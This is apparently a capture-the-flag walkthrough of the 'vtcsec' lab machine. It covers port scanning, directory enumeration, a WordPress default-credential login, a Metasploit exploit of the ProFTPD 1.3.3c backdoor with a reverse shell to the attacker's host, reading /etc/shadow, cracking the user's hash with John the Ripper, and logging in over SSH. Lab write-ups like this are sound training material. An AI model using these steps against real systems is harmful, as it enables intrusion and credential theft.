

Target IP: 192.168.56.101 (vtcsec)

```bash
$ nmap -sn 192.168.56.0/24

Nmap scan report for vtcsec (192.168.56.101)
Host is up (0.019s latency).

Nmap scan report for 192.168.56.102
Host is up (0.013s latency).
```

Using a fast full port scan we can see we have 3 open TCP ports: 21, 22 and 80.

```
$ nmap -p- -Pn -T4 192.168.56.101
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-09 18:38 UTC
Nmap scan report for vtcsec (192.168.56.101)
Host is up (0.041s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

Launching an nmap scan with -sCV flags we can see that the following services are running in the target machine:

| Port | Version |
|------|---------|
| 21   | ProFTPD 1.3.3c |
| 22   | OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 |
| 80   | Apache httpd 2.4.18 |

### Port 80 

My first thought was to search info about ProFTPD, but before that, we'll see a bit about the web app hosted in the Apache server. After accessing to its content, we can see the text "It works! This is a default...". We are going to perform a directory enumeration in order to fin hidden information.

```
dirb http://192.168.56.101
```

We have found a new interesting directory named "secret", but after investigating a bit I have found anything interesting. I can also see a wp admin form, so let's try the default credentials for WordPress. And surprisingly I have gained access. After investigating again I cant find anything interesting, so finally I move up to the next port.


### Port 21

Searching about this version ProFTPD 1.3.3c in searchsploit I can see there is a metasploit module to exploit a Backdoor Command Execution, so lets try it.

```
searchsploit ProFTPD 1.3.3c
msfconsole -q
```

Once we are in msfconsole:

```
search ProFTPD 1.3.3c
use exploit/unix/ftp/proftpd_133c_backdoor
set RHOSTS 192.168.56.101
set payload payload/cmd/unix/reverse
set LHOST 192.168.56.102
set LPORT 4444
run
```

> I list payloads using `show payloads`

After that we will gain access to the machine with privileged account. `/bin/bash -i` must be executed to upgrade our session. By listing the contents of /etc/shadow, we will see information about the target user marlinspike.

```
cat /etc/sahdow
```

![imagen](https://github.com/user-attachments/assets/6d78f97b-6b2a-4d55-96d3-d8d33f2c9326)

To obtain the plaintext password of the target user, John the Ripper can be used. 

```
$ cat shadow.txt
marlinspike:$6$wQb5nV3T$xB2WO/jOkbn4t1RUILrckw69LR/0EMtUbFFCYpM3MUHVmtyYW9.ov/aszTpWhLaC2x6Fvy5tpUUxQbUhCKbl4/:17484:0:99999:7:::
```
> $6$ â†’ SHA-512 crypt

```
$john --show shadow.txt
marlinspike:marlinspike:17484:0:99999:7:::
```
Let's verify that the credentials are correct by logging in via ssh.

```
$ssh marlinspike@192.168.56.101
marlinspike@192.168.56.101's password: 
Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.10.0-28-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

19 packages can be updated.
19 updates are security updates.

Last login: Sat Jan 31 14:20:27 2026 from 192.168.56.102
marlinspike@vtcsec:~$ 
```
